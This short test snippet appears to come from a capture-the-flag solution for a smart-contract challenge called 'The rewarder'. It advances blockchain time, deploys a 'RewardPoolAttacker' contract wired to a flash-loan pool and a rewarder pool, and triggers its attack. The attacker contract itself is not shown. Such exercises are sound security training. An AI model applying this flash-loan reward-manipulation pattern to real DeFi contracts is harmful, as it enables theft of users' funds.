...
describe('[Challenge] The rewarder', function () {
    ...
    it('Execution', async function () {
        ...
        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
        const rewardPoolAttacker = await (await ethers.getContractFactory('RewardPoolAttacker', player)).deploy(flashLoanPool.address, rewarderPool.address, liquidityToken.address, rewardToken.address);
        await rewardPoolAttacker.connect(player).attack();
    });
